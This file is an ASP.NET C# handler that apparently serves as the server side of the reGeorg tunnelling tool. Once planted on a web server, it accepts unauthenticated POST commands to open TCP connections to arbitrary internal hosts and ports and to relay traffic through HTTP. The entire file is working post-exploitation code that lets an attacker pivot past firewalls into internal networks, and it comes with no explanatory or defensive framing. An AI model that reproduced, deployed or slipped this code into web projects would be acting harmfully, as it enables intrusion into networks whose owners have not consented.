<%@ WebHandler Language="C#" Class="GenericHandler1" %>

using System;
using System.Web;
using System.Net;
using System.Net.Sockets;

public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSessionState
{
    
    public void ProcessRequest (HttpContext context) {
        try
        {
            if (context.Request.HttpMethod == "POST")
            {
                String cmd = context.Request.QueryString.Get("cmd").ToUpper();
                if (cmd == "CONNECT")
                {
                    try
                    {
                        String target = context.Request.QueryString.Get("target").ToUpper();
                        int port = int.Parse(context.Request.QueryString.Get("port"));
                        IPAddress ip = IPAddress.Parse(target);
                        System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                        Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        
                        sender.Connect(remoteEP);
                        sender.Blocking = false;                    
                        context.Session["socket"] = sender;
                        context.Response.AddHeader("X-STATUS", "OK");
                    }
                    catch (Exception ex)
                    {
                        context.Response.AddHeader("X-ERROR", ex.Message);
                        context.Response.AddHeader("X-STATUS", "FAIL");
                    }
                }
                else if (cmd == "DISCONNECT")
                {
                    try
                    {
                        Socket s = (Socket)context.Session["socket"];
                        s.Close();
                    }
                    catch (Exception ex)
                    {

                    }
                    context.Session.Abandon();
                    context.Response.AddHeader("X-STATUS", "OK");
                }
                else if (cmd == "FORWARD")
                {
                    Socket s = (Socket)context.Session["socket"];
                    try
                    {
                        int buffLen = context.Request.ContentLength;
                        byte[] buff = new byte[buffLen];
                        int c = 0;
                        while ((c = context.Request.InputStream.Read(buff, 0, buff.Length)) > 0)
                        {
                            s.Send(buff);
                        }
                        context.Response.AddHeader("X-STATUS", "OK");
                    }
                    catch (Exception ex)
                    {
                        context.Response.AddHeader("X-ERROR", ex.Message);
                        context.Response.AddHeader("X-STATUS", "FAIL");
                    }
                }
                else if (cmd == "READ")
                {
                    Socket s = (Socket)context.Session["socket"];
                    try
                    {
                        int c = 0;
                        byte[] readBuff = new byte[512];
                        try
                        {
                            while ((c = s.Receive(readBuff)) > 0)
                            {
                                byte[] newBuff = new byte[c];
                                Array.ConstrainedCopy(readBuff, 0, newBuff, 0, c);
                                context.Response.BinaryWrite(newBuff);
                            }
                            context.Response.AddHeader("X-STATUS", "OK");
                        }
                        catch (SocketException soex)
                        {
                            context.Response.AddHeader("X-STATUS", "OK");
                            return;
                        }

                    }
                    catch (Exception ex)
                    {
                        context.Response.AddHeader("X-ERROR", ex.Message);
                        context.Response.AddHeader("X-STATUS", "FAIL");
                    }
                }
            } else {
                context.Response.Write("Georg says, 'All seems fine'");
            }
        }
        catch (Exception exKak)
        {
            context.Response.AddHeader("X-ERROR", exKak.Message);
            context.Response.AddHeader("X-STATUS", "FAIL");
        }
    }
 
    public bool IsReusable {
        get {
            return false;
        }
    }

}
